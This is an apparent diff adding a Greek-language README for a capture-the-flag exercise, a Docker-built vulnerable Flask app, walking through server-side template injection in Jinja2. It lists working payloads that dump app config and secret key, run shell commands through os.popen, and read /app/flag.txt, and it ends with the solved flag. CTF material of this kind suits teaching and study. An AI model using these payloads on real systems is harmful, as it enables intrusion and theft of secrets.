@@ -1,0 +1,25 @@
+Εντολές για build και run:
+sudo docker image build -t vuln_flask .
+sudo docker run -p 5050:5050  vuln_flask
+
+
+
+Η άσκηση αυτή περιλαμβάνει μια επίθεση γνωστή και ως SSTI (Server-Side Template Injection) μέσα σε εφαρμογή
+Flask/Jinja2
+Η επίθεση αυτή είναι εφικτή λόγω της συνάρτησης render_template_string που παίρνει παράμετρο την οποία μπορούμε να
+τροποποιήσουμε μέσω του URL.
+Τα βήματα για μια επιτυχή επίθεση είναι τα εξής:
+Ελέγχουμε τον την πηγή της ιστοσελίδας. Το σχόλιο λεει ότι έχει χρησιμοποιηθεί Jinja2
+Ελέγχουμε το css me ctrl+shift+i ή πηγαίνοντας στο style selector. Μας λέει ότι η παράμετρος είναι name
+Βάζοντας στο τέλος του url ?name=mike βλέπουμε ότι πηγαίνουμε σε μια νέα σελίδα και το mike εμφανίζεται.
+Για το template injection σε Jinja2 το payload μπαίνει ανάμεσα σε διπλή αγκύλη.
+Αν γράψουμε ?name={{7*7}} παίρνουμε τον αριθμό 49 για παράδειγμα.
+Γράφοντας ?name={{config.items()}} παίρνουμε όλα τα configuration values της εφαρμογής.
+Βλέπουμε ότι το SECRET_KEY περιλαμβάνει την μισή σημαία μας κρυπτογραφημένη με Vigenere.
+Γράφοντας ?name={{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("ls").read() }} βλέπουμε όλα τα αρχεία του τρέχοντος directory. Παρατηρούμε ότι ένα από τα αρχεία λέγεται flag.txt
+Γράφοντας ?name={{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("cd ..;ls").read() }} Πηγαίνουμε προς τα πίσω και βλέπουμε ότι ένας από
+τους φακέλους λέγεται app. Εκεί βρίσκεται η εφαρμογή.
+Γράφοντας ?name={{ get_flashed_messages.__globals__.__builtins__.open("/app/flag.txt").read() }} ανοίγουμε το περιεχόμενο της σημαίας. Είναι η άλλη μισή σημαία και είναι και αυτή κρυπτογραφημένη με Vigenere.
+Χρησιμοποιώντας έναν Vigenere decryptor online, παίρνουμε το  αποτέλεσμα "CTF{M4ster_Jinj4}".
+
+MXD{W4wrov_Hsrh4}
